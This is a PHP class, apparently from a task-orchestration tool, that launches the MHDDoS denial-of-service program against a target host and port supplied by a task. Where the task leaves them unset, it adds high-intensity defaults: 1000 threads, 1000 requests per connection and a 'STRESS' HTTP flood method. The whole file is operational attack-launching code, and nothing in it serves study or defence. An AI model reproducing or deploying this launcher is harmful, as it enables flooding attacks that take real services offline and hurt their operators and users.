<?php

declare(strict_types=1);

namespace App\AppRunner;

use App\Struct\Task;
use Symfony\Component\Process\Process;

final class MHDDoSRunner extends AbstractRunner
{
    public function __construct(Task $task)
    {
        $this->task = $task;
    }
    public function run(): void
    {
        $args = $this->createArguments($this->task);

        \chdir('/opt/mhddos');

        $this->proc = new Process(command: $args, timeout: 0.0);
        $this->proc->start(function ($type, $data) {
            if ($type === Process::ERR) {
                fwrite(fopen('php://stderr', 'wb+'), $data);
            } else {
                fwrite(fopen('php://stdout', 'wb+'), $data);
            }
        });
    }

    private function createArguments(Task $task): array
    {
        $host = \sprintf('%s:%d',
            $this->task->host,
            $this->task->port);

        $args = [
            '/usr/bin/python3',
            '-u',
            '/opt/mhddos/runner.py',
            $host,
            ...$task->commandArgs,
        ];

        if (
            1 === \preg_match('/^https?/', $host)
            && !\in_array('--http-methods', $task->commandArgs)
        ) {
            $args[] = '--http-methods';
            $args[] = 'STRESS';
        }

        if (!\in_array('-t', $task->commandArgs)) {
            $args[] = '-t';
            $args[] = '1000';
        }

        if (!\in_array('-p', $task->commandArgs)) {
            $args[] = '-p';
            $args[] = '1200';
        }

        if (!\in_array('--rpc', $task->commandArgs)) {
            $args[] = '--rpc';
            $args[] = '1000';
        }

        if (!\in_array('--debug', $task->commandArgs)) {
            $args[] = '--debug';
        }

        return $args;
    }
}